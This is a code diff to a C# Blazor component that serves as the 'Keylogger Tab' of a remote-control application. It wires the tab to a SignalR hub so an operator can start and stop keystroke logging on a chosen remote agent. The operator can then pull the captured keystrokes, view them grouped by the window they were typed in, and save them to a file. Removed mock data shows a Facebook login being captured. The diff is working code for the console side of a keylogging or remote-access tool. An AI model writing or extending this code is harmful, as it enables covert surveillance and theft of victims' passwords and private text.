@@ -1,5 +1,9 @@
 @using RemoteControl.Shared.Models
+@using RemoteControl.Shared.Constants
+@using Microsoft.AspNetCore.SignalR.Client
 @inject IJSRuntime JSRuntime
+@inject NavigationManager Nav
+@implements IAsyncDisposable
 
 @* Keylogger Tab Component *@
 <div class="keylogger-container">
@@ -59,19 +63,18 @@
             }
             else
             {
-                string? lastApp = null;
-                @foreach (var entry in KeylogEntries)
+                var grouped = GroupEntriesByWindow(KeylogEntries);
+                @foreach (var group in grouped)
                 {
-                    @if (lastApp != null && lastApp != entry.WindowTitle)
+                    @if (group.ShowSeparator)
                     {
-                        <p class="log-separator">--- User switched to @entry.WindowTitle ---</p>
+                        <p class="log-separator">--- User switched to @group.WindowTitle ---</p>
                     }
                     <p class="log-entry">
-                        <span class="log-timestamp">[@entry.Timestamp.ToString("yyyy-MM-dd HH:mm:ss")]</span>
-                        <span class="log-app">[@entry.WindowTitle]:</span>
-                        @entry.KeyPressed
+                        <span class="log-timestamp">[@group.Timestamp.ToString("yyyy-MM-dd HH:mm:ss")]</span>
+                        <span class="log-app">[@group.WindowTitle]:</span>
+                        @group.Keys
                     </p>
-                    lastApp = entry.WindowTitle;
                 }
             }
             <span class="cursor-blink">_</span>
@@ -80,31 +83,124 @@
 </div>
 
 @code {
+    // CascadingParameter from DeviceControl
+    [CascadingParameter(Name = "AgentId")]
+    public string AgentId { get; set; } = string.Empty;
+
+    // SignalR
+    private HubConnection? _hubConnection;
+    private bool IsConnected => _hubConnection?.State == HubConnectionState.Connected;
+
+    // UI State
     private bool IsRecording { get; set; } = false;
+    private List<KeylogEntry> KeylogEntries { get; set; } = new();
 
-    // Mock data using Shared KeylogEntry model
-    private List<KeylogEntry> KeylogEntries { get; set; } = new()
+    protected override async Task OnInitializedAsync()
     {
-        new KeylogEntry { Timestamp = DateTime.Now.AddMinutes(-10), WindowTitle = "Chrome", KeyPressed = "facebook.com" },
-        new KeylogEntry { Timestamp = DateTime.Now.AddMinutes(-9), WindowTitle = "Chrome", KeyPressed = "user_login" },
-        new KeylogEntry { Timestamp = DateTime.Now.AddMinutes(-8), WindowTitle = "Chrome", KeyPressed = "*********" },
-        new KeylogEntry { Timestamp = DateTime.Now.AddMinutes(-5), WindowTitle = "Notepad", KeyPressed = "Hello world, this is a test." },
-        new KeylogEntry { Timestamp = DateTime.Now.AddMinutes(-3), WindowTitle = "Notepad", KeyPressed = "Testing keylogger feature." },
-        new KeylogEntry { Timestamp = DateTime.Now.AddMinutes(-1), WindowTitle = "VS Code", KeyPressed = "Console.WriteLine()" }
-    };
-
-    private void StartRecording()
-    {
-        IsRecording = true;
-        // TODO: Implement via SignalR - CommandRequest.CreateKeyloggerOn
-        Console.WriteLine("[Keylogger] Start recording requested");
+        await InitializeSignalR();
     }
 
-    private void StopRecording()
+    private async Task InitializeSignalR()
     {
+        _hubConnection = new HubConnectionBuilder()
+            .WithUrl(Nav.ToAbsoluteUri("/remotehub"))
+            .WithAutomaticReconnect()
+            .Build();
+
+        _hubConnection.On<CommandResult>(HubEvents.CommandCompleted, OnCommandCompleted);
+
+        try
+        {
+            await _hubConnection.StartAsync();
+            Console.WriteLine("[Keylogger] SignalR connected");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[Keylogger] SignalR error: {ex.Message}");
+        }
+    }
+
+    private void OnCommandCompleted(CommandResult result)
+    {
+        Console.WriteLine($"[Keylogger] OnCommandCompleted: AgentId={result.AgentId}, Success={result.Success}, Data type={result.Data?.GetType().Name ?? "null"}");
+        
+        if (result.AgentId != AgentId) 
+        {
+            Console.WriteLine($"[Keylogger] Skipped - AgentId mismatch (expected {AgentId})");
+            return;
+        }
+        if (!result.Success) return;
+
+        // KeylogResult is stored in CommandResult.Data
+        if (result.Data is System.Text.Json.JsonElement jsonElement)
+        {
+            Console.WriteLine($"[Keylogger] Data is JsonElement: {jsonElement.GetRawText().Substring(0, Math.Min(200, jsonElement.GetRawText().Length))}...");
+            try
+            {
+                var keylogResult = System.Text.Json.JsonSerializer.Deserialize<KeylogResult>(
+                    jsonElement.GetRawText(),
+                    new System.Text.Json.JsonSerializerOptions { PropertyNameCaseInsensitive = true });
+                
+                Console.WriteLine($"[Keylogger] Parsed KeylogResult: Entries count = {keylogResult?.Entries?.Count ?? 0}");
+                
+                if (keylogResult?.Entries != null && keylogResult.Entries.Count > 0)
+                {
+                    KeylogEntries.AddRange(keylogResult.Entries);
+                    Console.WriteLine($"[Keylogger] Added {keylogResult.Entries.Count} entries to UI");
+                    InvokeAsync(StateHasChanged);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[Keylogger] Parse error: {ex.Message}");
+            }
+        }
+        else
+        {
+            Console.WriteLine($"[Keylogger] Data is NOT JsonElement, type = {result.Data?.GetType().Name ?? "null"}");
+        }
+    }
+
+    private async Task StartRecording()
+    {
+        Console.WriteLine($"[Keylogger] StartRecording called. AgentId={AgentId}, IsConnected={IsConnected}");
+        
+        if (_hubConnection == null || !IsConnected) 
+        {
+            Console.WriteLine("[Keylogger] Not connected to SignalR!");
+            return;
+        }
+        if (string.IsNullOrEmpty(AgentId)) 
+        {
+            Console.WriteLine("[Keylogger] AgentId is empty!");
+            return;
+        }
+
+        IsRecording = true;
+        StateHasChanged();
+
+        var request = new CommandRequest { AgentId = AgentId, Type = CommandType.StartKeylogger };
+        await _hubConnection.InvokeAsync("SendCommand", request);
+        Console.WriteLine($"[Keylogger] Sent StartKeylogger to {AgentId}");
+    }
+
+    private async Task StopRecording()
+    {
+        Console.WriteLine($"[Keylogger] StopRecording called. IsConnected={IsConnected}");
+        
+        if (_hubConnection == null || !IsConnected) return;
+
         IsRecording = false;
-        // TODO: Implement via SignalR - CommandRequest.CreateKeyloggerOff
-        Console.WriteLine("[Keylogger] Stop recording requested");
+        StateHasChanged();
+
+        var request = new CommandRequest { AgentId = AgentId, Type = CommandType.StopKeylogger };
+        await _hubConnection.InvokeAsync("SendCommand", request);
+        Console.WriteLine("[Keylogger] Sent StopKeylogger");
+
+        // Request final keylog data
+        var getDataRequest = new CommandRequest { AgentId = AgentId, Type = CommandType.GetKeylogData };
+        await _hubConnection.InvokeAsync("SendCommand", getDataRequest);
+        Console.WriteLine("[Keylogger] Sent GetKeylogData");
     }
 
     private void ResetLogs()
@@ -117,14 +213,69 @@
     {
         if (KeylogEntries.Count == 0) return;
 
-        var content = string.Join("\n", KeylogEntries.Select(e => 
-            $"[{e.Timestamp:yyyy-MM-dd HH:mm:ss}] [{e.WindowTitle}]: {e.KeyPressed}"));
+        var grouped = GroupEntriesByWindow(KeylogEntries);
+        var lines = new List<string>();
         
+        foreach (var group in grouped)
+        {
+            if (group.ShowSeparator)
+            {
+                lines.Add($"--- User switched to {group.WindowTitle} ---");
+            }
+            lines.Add($"[{group.Timestamp:yyyy-MM-dd HH:mm:ss}] [{group.WindowTitle}]: {group.Keys}");
+        }
+        
+        var content = string.Join("\n", lines);
         var fileName = $"keylog_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
         
-        // Download via JS interop
         await JSRuntime.InvokeVoidAsync("downloadFile", fileName, content);
         Console.WriteLine($"[Keylogger] Saved to {fileName}");
+    }
+
+    public async ValueTask DisposeAsync()
+    {
+        if (_hubConnection != null)
+        {
+            await _hubConnection.DisposeAsync();
+        }
+    }
+
+    // ====== Group entries by window for cleaner display ======
+    private record KeylogGroup(DateTime Timestamp, string WindowTitle, string Keys, bool ShowSeparator);
+
+    private List<KeylogGroup> GroupEntriesByWindow(List<KeylogEntry> entries)
+    {
+        var groups = new List<KeylogGroup>();
+        if (entries.Count == 0) return groups;
+
+        string? lastWindow = null;
+        var currentKeys = new System.Text.StringBuilder();
+        DateTime currentTimestamp = entries[0].Timestamp;
+        string currentWindow = entries[0].WindowTitle;
+
+        foreach (var entry in entries)
+        {
+            if (entry.WindowTitle != currentWindow)
+            {
+                // Save previous group
+                groups.Add(new KeylogGroup(currentTimestamp, currentWindow, currentKeys.ToString(), lastWindow != null && lastWindow != currentWindow));
+                
+                // Start new group
+                lastWindow = currentWindow;
+                currentWindow = entry.WindowTitle;
+                currentTimestamp = entry.Timestamp;
+                currentKeys.Clear();
+            }
+            currentKeys.Append(entry.KeyPressed);
+        }
+
+        // Add last group
+        if (currentKeys.Length > 0)
+        {
+            groups.Add(new KeylogGroup(currentTimestamp, currentWindow, currentKeys.ToString(), lastWindow != null && lastWindow != currentWindow));
+        }
+
+        return groups;
     }
 }
 
